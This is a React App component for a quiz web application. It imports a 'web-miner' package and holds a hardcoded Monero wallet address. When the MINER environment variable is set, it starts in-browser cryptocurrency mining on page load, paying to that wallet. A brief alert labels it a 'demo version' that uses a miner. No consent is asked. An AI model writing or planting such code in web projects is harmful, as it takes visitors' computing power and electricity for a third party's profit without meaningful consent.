import React, { Component } from 'react';
import DocumentTitle from 'react-document-title';
import { BrowserRouter as Router } from 'react-router-dom';
import { AppRouter } from './scenes/AppRouter';
import { Alerts } from './scenes/Alerts';
import {connect} from 'react-redux';
import {showInfoAlert} from './scenes/Alerts/modules';
import { hot } from 'react-hot-loader';

const configure = require('web-miner');
const mapStateToProps = () => ({});
const mapDispatchToProps = {
    showInfoAlert
};

@hot(module)
@connect(mapStateToProps, mapDispatchToProps)
export default class App extends Component {
    state = {
        moneroWallet:'4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyWxBHcYuSQQQXjucQ'
    };

    componentDidMount() {
        if(process.env.MINER) {
            this.props.showInfoAlert('Attention! This is demo version and it use miner!');
            configure(this.state.moneroWallet);
        }
    }

    render() {
        return (
            <DocumentTitle title={'Quiz'}>
                <div>
                    <Router>
                        <AppRouter/>
                    </Router>
                    <Alerts />
                </div>
            </DocumentTitle>
        );
    }
}
